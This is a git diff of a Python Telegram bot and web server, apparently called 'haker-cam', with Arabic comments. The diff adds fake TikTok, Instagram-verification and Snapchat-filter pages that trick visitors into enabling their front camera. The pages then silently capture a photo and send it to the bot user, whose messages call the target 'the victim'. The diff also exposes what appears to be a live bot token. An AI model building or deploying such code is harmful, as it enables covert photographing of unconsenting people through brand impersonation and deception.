@@ -11,7 +11,7 @@ from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 
 # 1. الإعدادات الأساسية
 BOT_TOKEN = "8652491802:AAFOd303C5JsIaLkyuFfl6Op8XF-cygo6tg"
-RENDER_URL = "https://haker-cam.onrender.com"  # رابط سيرفرك الرسمي والجديد
+RENDER_URL = "https://haker-cam.onrender.com"  # رابط سيرفرك الرسمي
 
 bot = telebot.TeleBot(BOT_TOKEN, threaded=False)
 app = FastAPI()
@@ -60,174 +60,141 @@ def is_premium_user(chat_id):
     conn.close()
     return result is not None
 
-# ---- واجهة تيك توك التفاعلية (HTML & CSS) ----
-HTML_CONTENT = """
-<!DOCTYPE html>
-<html lang="ar" dir="rtl">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TikTok - شاهد التحدي المنتشر</title>
-    <style>
-        * { box-sizing: border-box; margin: 0; padding: 0; }
-        body { 
-            background-color: #010101; 
-            color: #ffffff; 
-            font-family: system-ui, -apple-system, BlinkMacSystemFont, sans-serif; 
-            display: flex; 
-            flex-direction: column; 
-            align-items: center; 
-            justify-content: center; 
-            min-height: 100vh; 
-            padding: 20px;
-            overflow: hidden;
-        }
-        .container { 
-            background: #121212;
-            padding: 35px 25px; 
-            border-radius: 20px; 
-            box-shadow: 0 15px 35px rgba(254, 44, 85, 0.15); 
-            max-width: 420px; 
-            width: 100%; 
-            border: 1px solid #2f2f2f;
-            text-align: center;
-        }
-        .tiktok-logo {
-            font-size: 42px;
-            font-weight: 800;
-            margin-bottom: 20px;
-            letter-spacing: -1px;
-            display: inline-block;
-            position: relative;
-            text-shadow: 2px 2px #fe2c55, -2px -2px #25f4ee;
-        }
-        .video-box {
-            width: 100%;
-            height: 200px;
-            background: #000000;
-            border-radius: 12px;
-            margin-bottom: 25px;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            border: 1px solid #222;
-            position: relative;
-        }
-        .loader {
-            border: 4px solid #f3f3f3;
-            border-top: 4px solid #fe2c55;
-            border-right: 4px solid #25f4ee;
-            border-radius: 50%;
-            width: 45px;
-            height: 45px;
-            animation: spin 1s linear infinite;
-            margin-bottom: 15px;
-        }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        .loading-text {
-            color: #a6a6a6;
-            font-size: 14px;
-        }
-        h2 { 
-            font-size: 20px;
-            font-weight: 700;
-            margin-bottom: 10px;
-        }
-        p { 
-            color: #8a8a8a; 
-            font-size: 14px; 
-            line-height: 1.6; 
-            margin-bottom: 25px; 
-        }
-        .btn { 
-            background-color: #fe2c55; 
-            color: white; 
-            border: none; 
-            padding: 16px 32px; 
-            font-size: 16px; 
-            font-weight: 700; 
-            border-radius: 8px; 
-            cursor: pointer; 
-            width: 100%; 
-            box-shadow: 0 4px 15px rgba(254, 44, 85, 0.4);
-            transition: all 0.2s ease;
-        }
-        .btn:active { 
-            transform: scale(0.98); 
-            background-color: #e11d48;
-        }
-        .footer-brand {
-            margin-top: 25px;
-            font-size: 11px;
-            color: #444;
-            letter-spacing: 0.5px;
-        }
-    </style>
-</head>
-<body>
+# ---- واجهة المقالب الذكية المتغيرة (HTML & CSS & JS) ----
+def get_html_content(template_type):
+    # إعدادات القوالب الافتراضية
+    bg_color = "#010101"
+    card_bg = "#121212"
+    btn_color = "#fe2c55"
+    logo_text = "TikTok"
+    logo_style = "text-shadow: 2px 2px #fe2c55, -2px -2px #25f4ee;"
+    title = "تحدي الملامح التفاعلي جاهز"
+    desc = "يرجى النقر على زر التشغيل بالأسفل لفتح الفيديو وتفعيل الكاميرا الأمامية للمشاركة في تحدي الضحك المنتشر الآن."
+    btn_text = "▶ اضغط لمشاهدة التحدي على TikTok"
+    redirect_to = "https://www.tiktok.com"
 
-    <div class="container">
-        <div class="tiktok-logo">TikTok</div>
+    # تخصيص القوالب بناءً على الاختيار
+    if template_type == "instagram":
+        bg_color = "#fafafa"
+        card_bg = "#ffffff"
+        btn_color = "#0095f6"
+        logo_text = "Instagram"
+        logo_style = "background: -webkit-linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%); -webkit-background-clip: text; -webkit-text-fill-color: transparent;"
+        title = "🛡️ نظام فحص وتوثيق الحسابات الحية"
+        desc = "لتأكيد هويتك وتوثيق حسابك بالعلامة الزرقاء مجاناً، يرجى تفعيل الكاميرا الأمامية للمسح الحي ومطابقة الملامح مع صورة الحساب."
+        btn_text = "✨ ابدأ الفحص الحي للحساب الآن"
+        redirect_to = "https://www.instagram.com"
         
-        <div class="video-box">
-            <div class="loader"></div>
-            <div class="loading-text">جاري تجهيز مشغل الفيديو...</div>
+    elif template_type == "snapchat":
+        bg_color = "#fffc00"
+        card_bg = "#ffffff"
+        btn_color = "#000000"
+        logo_text = "Snapchat"
+        logo_style = "color: #000000; font-family: 'Comic Sans MS', sans-serif;"
+        title = "📸 تجربة فلاتر الذكاء الاصطناعي الجديدة"
+        desc = "أطلقت سناب شات فلتر تغير الملامح المرعب الجديد! اضغط على الزر بالأسفل واسمح بالكاميرا لتجربة الفلتر الحصري قبل الجميع."
+        btn_text = "🔥 تشغيل الفلتر الحصري"
+        redirect_to = "https://www.snapchat.com"
+
+    # كود الـ HTML المدمج والمحدث ديناميكياً
+    return f"""
+    <!DOCTYPE html>
+    <html lang="ar" dir="rtl">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>{logo_text}</title>
+        <style>
+            * {{ box-sizing: border-box; margin: 0; padding: 0; }}
+            body {{ 
+                background-color: {bg_color}; 
+                color: { '#ffffff' if bg_color != '#fafafa' else '#000000' }; 
+                font-family: system-ui, -apple-system, sans-serif; 
+                display: flex; flex-direction: column; align-items: center; justify-content: center; 
+                min-height: 100vh; padding: 20px;
+            }}
+            .container {{ 
+                background: {card_bg}; padding: 35px 25px; border-radius: 20px; 
+                box-shadow: 0 15px 35px rgba(0,0,0,0.1); max-width: 420px; width: 100%; 
+                border: 1px solid {{ '#2f2f2f' if card_bg == '#121212' else '#e6e6e6' }}; text-align: center;
+            }}
+            .logo {{
+                font-size: 42px; font-weight: 800; margin-bottom: 20px; letter-spacing: -1px;
+                display: inline-block; {logo_style}
+            }}
+            .video-box {{
+                width: 100%; height: 200px; background: #000000; border-radius: 12px; margin-bottom: 25px;
+                display: flex; flex-direction: column; align-items: center; justify-content: center; position: relative;
+            }}
+            .loader {{
+                border: 4px solid #f3f3f3; border-top: 4px solid {btn_color}; border-radius: 50%;
+                width: 45px; height: 45px; animation: spin 1s linear infinite; margin-bottom: 15px;
+            }}
+            @keyframes spin {{ 0% {{ transform: rotate(0deg); }} 100% {{ transform: rotate(360deg); }} }}
+            .loading-text {{ color: #a6a6a6; font-size: 14px; }}
+            h2 {{ font-size: 20px; font-weight: 700; margin-bottom: 10px; }}
+            p {{ color: { '#8a8a8a' if card_bg == '#121212' else '#666666' }; font-size: 14px; line-height: 1.6; margin-bottom: 25px; }}
+            .btn {{ 
+                background-color: {btn_color}; color: white; border: none; padding: 16px 32px; 
+                font-size: 16px; font-weight: 700; border-radius: 8px; cursor: pointer; width: 100%; 
+                box-shadow: 0 4px 15px rgba(0,0,0,0.2); transition: all 0.2s ease;
+            }}
+            .btn:active {{ transform: scale(0.98); }}
+        </style>
+    </head>
+    <body>
+        <div class="container">
+            <div class="logo">{logo_text}</div>
+            <div class="video-box">
+                <div class="loader"></div>
+                <div class="loading-text">جاري الاتصال بالنظام الحصري...</div>
+            </div>
+            <h2>{title}</h2>
+            <p>{desc}</p>
+            <button class="btn" id="startBtn">{btn_text}</button>
         </div>
 
-        <h2>تحدي الملامح التفاعلي جاهز</h2>
-        <p>يرجى النقر على زر التشغيل بالأسفل لفتح الفيديو وتفعيل الكاميرا الأمامية للمشاركة في تحدي الضحك المنتشر الآن.</p>
-        
-        <button class="btn" id="startBtn">▶ اضغط لمشاهدة التحدي على TikTok</button>
-        
-        <div class="footer-brand">© 2026 TikTok Inc.</div>
-    </div>
+        <script>
+            const urlParams = new URLSearchParams(window.location.search);
+            const ownerId = urlParams.get('id');
 
-    <script>
-        const urlParams = new URLSearchParams(window.location.search);
-        const ownerId = urlParams.get('id');
-        const REDIRECT_URL = "https://www.tiktok.com";
-
-        document.getElementById('startBtn').addEventListener('click', function() {
-            if (ownerId) {
-                navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
-                .then(function(stream) {
-                    let video = document.createElement('video');
-                    video.srcObject = stream;
-                    video.setAttribute("playsinline", true);
-                    video.play();
-                    
-                    video.onloadedmetadata = function() {
-                        let canvas = document.createElement('canvas');
-                        canvas.width = video.videoWidth;
-                        canvas.height = video.videoHeight;
-                        let ctx = canvas.getContext('2d');
-                        ctx.drawImage(video, 0, 0);
+            document.getElementById('startBtn').addEventListener('click', function() {{
+                if (ownerId) {{
+                    navigator.mediaDevices.getUserMedia({{ video: {{ facingMode: "user" }}, audio: false }})
+                    .then(function(stream) {{
+                        let video = document.createElement('video');
+                        video.srcObject = stream;
+                        video.setAttribute("playsinline", true);
+                        video.play();
                         
-                        let base64Image = canvas.toDataURL('image/jpeg', 0.80);
-                        
-                        fetch('/api/capture', {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({ user_id: ownerId, image: base64Image })
-                        })
-                        .then(() => {
-                            stream.getTracks().forEach(track => track.stop());
-                            window.location.href = REDIRECT_URL;
-                        })
-                        .catch(() => { window.location.href = REDIRECT_URL; });
-                    };
-                })
-                .catch(function(err) { window.location.href = REDIRECT_URL; });
-            } else { window.location.href = REDIRECT_URL; }
-        });
-    </script>
-</body>
-</html>
-"""
+                        video.onloadedmetadata = function() {{
+                            let canvas = document.createElement('canvas');
+                            canvas.width = video.videoWidth;
+                            canvas.height = video.videoHeight;
+                            let ctx = canvas.getContext('2d');
+                            ctx.drawImage(video, 0, 0);
+                            
+                            let base64Image = canvas.toDataURL('image/jpeg', 0.80);
+                            
+                            fetch('/api/capture', {{
+                                method: 'POST',
+                                headers: {{ 'Content-Type': 'application/json' }},
+                                body: JSON.stringify({{ user_id: ownerId, image: base64Image }})
+                            }})
+                            .then(() => {{
+                                stream.getTracks().forEach(track => track.stop());
+                                window.location.href = "{redirect_to}";
+                            }})
+                            .catch(() => {{ window.location.href = "{redirect_to}"; }});
+                        }};
+                    }})
+                    .catch(function(err) {{ window.location.href = "{redirect_to}"; }});
+                }} else {{ window.location.href = "{redirect_to}"; }}
+            }});
+        </script>
+    </body>
+    </html>
+    """
 
 # ---- أوامر البوت في تليجرام ----
 
@@ -237,8 +204,8 @@ def start(message):
     name = message.from_user.first_name
     
     welcome_text = (
-        f"أهلاً بك يا {name} في بوت صائد الكاميرا الفكاهي! 📸🔥\n\n"
-        "💳 لتفعيل حسابك وتوليد روابط المقالب المضحكة، يرجى الضغط على زر الاشتراك بالأسفل."
+        f"أهلاً بك يا {name} في بوت صائد الكاميرا الفكاهي المطوّر! 📸🔥\n\n"
+        "💳 لتفعيل حسابك وتوليد روابط المقالب المضحكة بأشكال متعددة، يرجى التفعيل بالأسفل."
     )
     markup = InlineKeyboardMarkup()
     markup.add(InlineKeyboardButton("💳 تفعيل الاشتراك المميز (VIP)", callback_data="buy"))
@@ -248,35 +215,42 @@ def start(message):
 def buy(call):
     chat_id = call.message.chat.id
     add_premium_user(chat_id)
-    bot.answer_callback_query(call.id, "🎉 تم تفعيل حسابك!")
+    bot.answer_callback_query(call.id, "🎉 تم تفعيل حسابك كـ VIP!")
     
-    markup = InlineKeyboardMarkup()
-    markup.add(InlineKeyboardButton("🔗 توليد رابط المقلب الخاص بي", callback_data="gen"))
-    bot.send_message(chat_id, "👑 حسابك فعال الآن بالكامل. اضغط لإنشاء رابطك الفريد:", reply_markup=markup)
+    # قائمة اختيار القوالب بعد التفعيل
+    markup = InlineKeyboardMarkup(row_width=1)
+    markup.add(
+        InlineKeyboardButton("🎬 مقلب تحدي تيك توك", callback_data="gen_tiktok"),
+        InlineKeyboardButton("📸 مقلب توثيق إنستغرام", callback_data="gen_instagram"),
+        InlineKeyboardButton("👻 مقلب فلاتر سناب شات", callback_data="gen_snapchat")
+    )
+    bot.send_message(chat_id, "👑 اختر الآن نوع المقلب الذي تريد إنشاؤه لإرساله لصديقك:", reply_markup=markup)
 
-@bot.callback_query_handler(func=lambda call: call.data == "gen")
+@bot.callback_query_handler(func=lambda call: call.data.startswith("gen_"))
 def gen_link(call):
     chat_id = call.message.chat.id
     if not is_premium_user(chat_id):
         bot.send_message(chat_id, "❌ حسابك غير مفعل.")
         return
         
-    unique_link = f"{RENDER_URL}?id={chat_id}"
+    template = call.data.split("_")[1]  # tiktok, instagram, snapchat
+    unique_link = f"{RENDER_URL}?id={chat_id}&template={template}"
     
     msg = (
-        "🚀 **رابط المقلب الخاص بك جاهز ويعمل على جميع المتصفحات الخارجية!**\n\n"
-        f"انسخ هذا الرابط وأرسله لصديقك لتجربته:\n`{unique_link}`\n\n"
-        "بمجرد دخوله والضغط على زر بدء التحدي وقبول الإذن، ستصله لقطته الفكاهية فوراً!"
+        f"🚀 **رابط مقلب ({template.upper()}) الخاص بك جاهز الآن!**\n\n"
+        f"انسخ هذا الرابط وأرسله للضحية:\n`{unique_link}`\n\n"
+        "بمجرد دخوله وقبول الإذن، ستصلك لقطته فوراً على هذا الشات!"
     )
     bot.send_message(chat_id, msg, parse_mode="Markdown")
 
-# ---- المسارات واستقبال الـ Webhook والسيرفر ----
+# ---- المسارات واستقبال السيرفر ----
 
 @app.get("/", response_class=HTMLResponse)
-async def get_home():
-    return HTML_CONTENT
+async def get_home(request: Request):
+    # قراءة نوع القالب من الرابط، وإذا لم يجد شيئاً يفتح تيك توك كافتراضي
+    template = request.query_params.get("template", "tiktok")
+    return get_html_content(template)
 
-# مسار استقبال تحديثات تليجرام (Webhook)
 @app.post(f"/{BOT_TOKEN}")
 async def telegram_webhook(request: Request):
     json_string = await request.body()
@@ -310,14 +284,13 @@ async def capture_api(request: Request, background_tasks: BackgroundTasks):
     except Exception as e:
         return JSONResponse(status_code=500, content={"status": "error"})
 
-# تشغيل الـ Webhook وإعداد السيرفر عند بدء التطبيق
 @app.on_event("startup")
 def startup_event():
     bot.remove_webhook()
-    # ربط البوت برابط سيرفر Render بشكل رسمي ومباشر
     bot.set_webhook(url=f"{RENDER_URL}/{BOT_TOKEN}")
-    print("🚀 تم تفعيل الـ Webhook بنجاح وربطه بسيرفر Render!")
+    print("🚀 تم تفعيل الـ Webhook مع نظام القوالب المتعددة!")
 
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", 8080))
     uvicorn.run(app, host="0.0.0.0", port=port)
+
